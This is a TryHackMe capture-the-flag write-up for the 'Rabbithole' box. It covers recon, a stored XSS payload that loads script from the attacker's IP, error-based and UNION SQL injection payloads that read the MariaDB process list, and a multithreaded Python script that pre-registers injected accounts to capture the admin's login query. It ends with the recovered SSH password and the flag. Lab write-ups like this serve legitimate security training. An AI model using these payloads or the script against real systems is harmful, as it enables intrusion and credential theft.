# RABBITHOLE (THM) -- Full Walkthrough & Write-Up

> **Difficulty:** Hard\
> **Author:** David Umoh\
> **Date:** 2025-09-14\
> **Tested on:** Kali (attacker) • Ubuntu Jammy host (target) •
> Dockerized webapp container

------------------------------------------------------------------------

## 1. Scope & Setup

-   Target IP: `TARGET_IP` (add `rabbithole.thm` in `/etc/hosts`)\
-   Attacker IP: `ATTACKER_IP` (example: `10.8.137.194`)\
-   All actions performed for learning (TryHackMe only)

``` bash
echo "TARGET_IP rabbithole.thm" | sudo tee -a /etc/hosts
```

------------------------------------------------------------------------

## 2. Initial Reconnaissance

Run an **Nmap** scan to identify open ports and services:

``` bash
nmap -sCV rabbithole.thm -p-
```

**Result:**

    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.59 ((Debian))
    |_http-title: Your page title here :)
    |_http-server-header: Apache/2.4.59 (Debian)
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set

Navigate to **`http://rabbithole.thm`** → login and registration
endpoints are visible.

------------------------------------------------------------------------

## 3. Registration & Login

The **registration page** warns about:

> *"There are anti-bruteforce measures in place. Login functionality is
> actively monitored."*

This suggested potential XSS filtering bypass.

-   Registered a test account:
    -   Username: `tester`\
    -   Password: `1111`

After login, the dashboard showed only: - Admin login times\
- User's current login time

Nothing useful at this stage.

------------------------------------------------------------------------

## 4. XSS & SQL Injection Discovery

Confirmed **stored XSS** with:

``` html
<script src="http://10.8.137.194/xss.js"></script>
```

Hosted the payload with:

``` bash
python3 -m http.server 8000
```

Execution was successful. During login, an SQL error confirmed **SQL
injection**:

    SQLSTATE[42000]: Syntax error or access violation: 1064 ...

👉 Stored payloads execute on the backend during login → backend-side
injection confirmed.

------------------------------------------------------------------------

## 5. Extracting Database Information

Using **error-based SQLi** with `EXTRACTVALUE`, I enumerated:

-   **Database:** `web`
-   **Tables:** `users`, `logins`
-   **Columns (users):** `id`, `username`, `password`, `group`

Example payload:

``` sql
tester" AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))-- -
```

**Usernames found:** - `admin` - `foo` - `bar`

**Password hashes:** 1. `admin` → `0e3ab8e45ac1163c2343990e427c66ff`\
2. `foo` → `a51e47f646375ab6bf5dd2c42d3e6181` → cracked: **rabbit**\
3. `bar` → `de97e75e5b4604526a2afaed5f5439d7` → cracked: **hole**

Hashes cracked with:

``` bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
```

Admin hash couldn't be cracked. Logging in as `foo` or `bar` was a dead
end.

------------------------------------------------------------------------

## 6. PROCESSLIST Exfiltration

**Why PROCESSLIST?**\
The MariaDB `information_schema.PROCESSLIST` shows currently running
queries. Admin's login query persisted briefly due to `SLEEP()`.\
By exfiltrating `INFO`, we could capture the raw admin query.

If an attacker can inject SQL that reads `PROCESSLIST.INFO` (or the textual column containing the running query), they can copy the running query text into a column or return it directly to the web page. That text can include sensitive items if the application forms the query with sensitive literals.

Example payloads:

``` sql
test" UNION SELECT 1,MID(INFO,1,16) FROM information_schema.PROCESSLIST WHERE INFO NOT LIKE '%info%' -- -
test" UNION SELECT 1,MID(INFO,17,32) FROM information_schema.PROCESSLIST WHERE INFO NOT LIKE '%info%' -- -
```

**Challenge:** query disappears fast → required **pre-registered
accounts** + automation script.

------------------------------------------------------------------------

## 7. Automation Script

A Python script automated registration & login with chunked payloads to capture the full admin query.
``` python

import sys
import requests
import threading
import time
import argparse
from bs4 import BeautifulSoup

def build_payload(offset, chunk_len):
    return (
        f'test" UNION SELECT 1, MID(INFO,{offset},{chunk_len}) '
        f'FROM information_schema.PROCESSLIST WHERE INFO NOT LIKE \'%info%\' -- -'
    )

def register_account(base, reg_path, payload, pw="pw"):
    s = requests.Session()
    try:
        s.post(base + reg_path, data={"username": payload, "password": pw, "submit": "Register"}, timeout=6, allow_redirects=True)
    except Exception:
        pass
    return s

def parse_chunk_from_home(text):
    try:
        soup = BeautifulSoup(text, "html.parser")
        tables = soup.find_all("table", class_="u-full-width")
        if len(tables) >= 2:
            td = tables[1].find("td")
            if td:
                return td.get_text().strip()
    except Exception:
        pass
    return ""

def worker_thread(i, session, base, login_path, chunk_idx, chunk_len, results, stop_event, verbose=False):
    while not stop_event.is_set():
        try:
            session.post(base + login_path, data={"username": session._payload, "password": "pw", "login": "Login"}, timeout=4, allow_redirects=True)
        except Exception:
            pass
        try:
            r = session.get(base, timeout=4)
            text = r.text or ""
            got = parse_chunk_from_home(text)
            if got:
                results[chunk_idx] = got
                if verbose:
                    print(f"[+] thread {i} captured chunk {chunk_idx}: {got[:80]}")
                return
        except Exception:
            pass
        time.sleep(0.04)

def looks_complete(stitched):
    """
    Heuristic: if there is an md5('...') pattern, ensure closing "')" exists.
    If there is no md5(' present, we conservatively treat as complete.
    """
    if "md5('" in stitched.lower():
        # count of single quotes after md5( — simple check for closing quote
        # find the first md5(' occurrence and verify there's a closing single-quote after it
        idx = stitched.lower().find("md5('")
        tail = stitched[idx+5:]
        return ("')" in tail) or ("' )" in tail)  # allow small variations
    return True

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("base", help="Base URL e.g. http://rabbithole.thm/")
    parser.add_argument("--register", default="register.php", help="Registration path")
    parser.add_argument("--login", default="login.php", help="Login path")
    parser.add_argument("--chunks", type=int, default=15, help="Initial number of chunks to prepare")
    parser.add_argument("--chunk-len", type=int, default=16, help="Characters per chunk")
    parser.add_argument("--max-wait", type=int, default=0, help="Seconds to wait overall (0=infinite)")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    base = args.base
    if not base.endswith("/"):
        base += "/"

    CHUNKS = args.chunks
    CLEN = args.chunk_len
    MAX_TOTAL_CHUNKS = 200  # hard safety cap

    print("[*] Target:", base)
    results = {}
    sessions = []
    threads = []
    stop_event = threading.Event()

    # helper to prepare a single chunk session and start its worker
    def prepare_and_start(idx):
        offset = idx * CLEN + 1
        payload = build_payload(offset, CLEN)
        s = register_account(base, args.register, payload)
        s._payload = payload
        sessions.append(s)
        t = threading.Thread(target=worker_thread, args=(idx, s, base, args.login, idx, CLEN, results, stop_event, args.verbose), daemon=True)
        t.start()
        threads.append(t)
        if args.verbose:
            print(f"[v] prepared chunk {idx} offset {offset}")
        # short pause
        time.sleep(0.03)

    # prepare initial batch
    print(f"[*] Pre-registering {CHUNKS} payload-accounts ...")
    for idx in range(CHUNKS):
        prepare_and_start(idx)

    start_time = time.time()
    try:
        # wait loop: either all initial chunks captured OR need to auto-extend
        while True:
            # overall timeout check
            if args.max_wait and (time.time() - start_time) > args.max_wait:
                if args.verbose:
                    print("[!] overall max-wait exceeded")
                break

            # if we have enough captured to consider stitched
            stitched = "".join(results.get(i, "") for i in range(len(sessions))).strip()
            if len(results) >= len(sessions):
                # all current sessions captured — check completeness
                if looks_complete(stitched):
                    if args.verbose:
                        print("[*] captured all current chunks and looks complete")
                    break
                # else need to extend: add one more chunk and continue
                if len(sessions) >= MAX_TOTAL_CHUNKS:
                    print("[!] reached max total chunks limit; stopping")
                    break
                next_idx = len(sessions)
                if args.verbose:
                    print(f"[*] captured partial output but not complete; preparing extra chunk {next_idx}")
                prepare_and_start(next_idx)
                # give the new thread a short window to capture
                time.sleep(0.7)
                continue

            # not all current sessions captured yet — keep waiting briefly
            if args.verbose:
                print(f"[v] progress: {len(results)}/{len(sessions)} captured")
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("[!] interrupted by user")

    # stop workers
    stop_event.set()
    time.sleep(0.1)

    # final stitch and print
    stitched_final = "".join(results.get(i, "") for i in range(len(sessions))).strip()
    print("\n[FINAL OUTPUT]")
    if stitched_final:
        print(stitched_final)
    else:
        print("(empty) -- try increasing --max-wait or enable --verbose and paste a sample homepage HTML for debugging)")

if __name__ == "__main__":
    main()
```

Run with:

``` bash
python3 rabbithole.py http://rabbithole.thm/ --chunks 16 --chunk-len 16 --max-wait 120
```

**Captured query:**

``` sql
SELECT * FROM logins where username ="admin" ORDpassword=md5('fEeFBqOXBOLmjpTt0B3LNpuwlr7mJxI9dR8kgTpbOQcLlvgmoCt35qogicf8ao0Q') ) UNION ALL SELECT null,null,null,SLEEP(5) LIMIT 2
```

------------------------------------------------------------------------

## 8. SSH Access as Admin

Use the recovered password to SSH into the box:

``` bash
ssh admin@rabbithole.thm
```

**Password:**

    fEeFBqOXBOLmjpTt0B3LNpuwlr7mJxI9dR8kgTpbOQcLlvgmoCt35qogicf8ao0Q

Retrieve the flag:

``` bash
cat flag.txt
```

**Flag:**

    THM{this_is_the_way_step_inside_jNu8uJ9tvKfH1n48}
